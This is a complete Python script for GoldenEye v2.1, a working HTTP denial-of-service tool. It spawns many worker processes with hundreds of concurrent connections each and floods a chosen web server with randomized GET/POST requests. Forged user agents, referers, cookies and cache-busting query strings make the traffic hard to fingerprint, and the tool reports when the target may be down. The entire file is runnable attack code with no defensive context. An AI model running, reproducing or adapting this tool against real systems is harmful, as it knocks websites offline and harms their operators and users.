#!/usr/bin/env python3

from multiprocessing import Process, Manager, Pool
import urllib.parse, ssl
import sys, getopt, random, time, os
import http.client

HTTPCLIENT = http.client

####
# Config
####
DEBUG = False
SSLVERIFY = True

####
# Constants
####
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500

GOLDENEYE_BANNER = 'GoldenEye v2.1'

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)] + ['Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6)] + ['.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1, 31), random.randint(1, 12), random.randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}


####
# GoldenEye Class
####

class GoldenEye(object):
    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print("Shutting down GoldenEye")

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Taunt!
        print()
        print(GOLDENEYE_BANNER)
        print()

    # Do the fun!
    def fire(self):

        self.printHeader()
        print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets))

        if DEBUG:
            print("Starting {0} concurrent workers".format(self.nr_workers))

        # Start workers
        for i in range(int(self.nr_workers)):

            try:

                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except Exception:
                error("Failed to start worker {0}".format(i))
                pass

        if DEBUG:
            print("Initiating monitor")
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print("{0} GoldenEye strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print("\tServer may be DOWN!")

                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except Exception:
            pass  # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print("Killing worker {0}".format(worker.name))
                        # worker.terminate()
                        worker.stop()
                    except Exception:
                        pass  # silently ignore
                if DEBUG:
                    raise
                else:
                    pass


####
# Striker Class
####

class Striker(Process):
    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Striker, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urllib.parse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443

        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'
        ]

    def __del__(self):
        self.stop()

    # builds random ascii string
    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = list(range(97, 122))
        _UPPERCASE = list(range(65, 90))
        _NUMERIC = list(range(48, 57))

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str

    def run(self):

        if DEBUG:
            print("Starting worker {0}".format(self.name))

        while self.runnable:

            try:

                for i in range(self.nr_socks):

                    if self.ssl:
                        if SSLVERIFY:
                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                        else:
                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:
                    (url, headers) = self.createPayload()

                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:
                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()

            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass  # silently ignore

        if DEBUG:
            print("Worker {0} completed run. Sleeping...".format(self.name))

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass  # silently ignore

    def createPayload(self):

        req_url, headers = self.generateData()

        random_keys = list(headers.keys())
        random.shuffle(random_keys)
        random_headers = {}

        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount=1):

        queryString = []

        for i in range(ammount):
            key = self.buildblock(random.randint(3, 10))
            value = self.buildblock(random.randint(3, 20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)

    def generateData(self):

        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()

        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner='?'):

        return self.url + param_joiner + self.generateQueryString(random.randint(1, 5))

    def getUserAgent(self):

        if self.useragents:
            return random.choice(self.useragents)

        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0"  # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(list(USER_AGENT_PARTS['os'].keys()))]
        os_name = random.choice(os['name'])
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(list(USER_AGENT_PARTS['platform'].keys()))]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))

        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0])

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))

        return ua_string

    def generateRandomHeaders(self):

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives) - 1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1, int(len(acceptEncoding) / 2))
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1, 1000),
            'Host': self.host,
        }

        # Randomly-added headers
        # These headers are optional and are
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1], round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer
            url_part = self.buildblock(random.randint(5, 10))

            random_referer = random.choice(self.referers) + url_part

            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

        return http_headers

    # Housekeeping
    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    # Counter Functions
    def incCounter(self):
        try:
            self.counter[0] += 1
        except Exception:
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except Exception:
            pass


####

####
# Other Functions
####

def usage():
    print()
    print('-----------------------------------------------------------------------------------------------------------')
    print()
    # print(GOLDENEYE_BANNER)
    print()
    print(' USAGE: ./goldeneye.py <url> [OPTIONS]')
    print()
    print(' OPTIONS:')
    print('\t Flag\t\t\tDescription\t\t\t\t\t\tDefault')
    print('\t -u, --useragents\t使用用户代理的文件\t\t\t\t(默认值：随机生成)')
    print('\t -w, --workers\t\t同时工作的数目\t\t\t\t(默认值: {0})'.format(DEFAULT_WORKERS))
    print('\t -s, --sockets\t\t并发套接字数\t\t\t\t(默认值: {0})'.format(DEFAULT_SOCKETS))
    print('\t -m, --method\t\t要使用的HTTP方法 \'get\' or \'post\'  or \'random\'\t\t(默认值: get)')
    print('\t -n, --nosslcheck\t不验证SSL证书\t\t\t\t(默认值: True)')
    print('\t -d, --debug\t\t启用调试模式 [更详细的输出]\t\t\t(默认值: False)')
    print('\t -h, --help\t\t显示此帮助')
    print()
    print('-----------------------------------------------------------------------------------------------------------')


def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg + "\n"))
    usage()
    sys.exit(2)


####
# Main
####

def main():
    try:

        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url == None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents"])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-n", "--nosslcheck"):
                global SSLVERIFY
                SSLVERIFY = False
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '" + o + "' doesn't exists")

        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except EnvironmentError:
                error("cannot read file {0}".format(uas_file))

        goldeneye = GoldenEye(url)
        goldeneye.useragents = useragents
        goldeneye.nr_workers = workers
        goldeneye.method = method
        goldeneye.nr_sockets = socks

        goldeneye.fire()

    except getopt.GetoptError as err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)


if __name__ == "__main__":
    main()
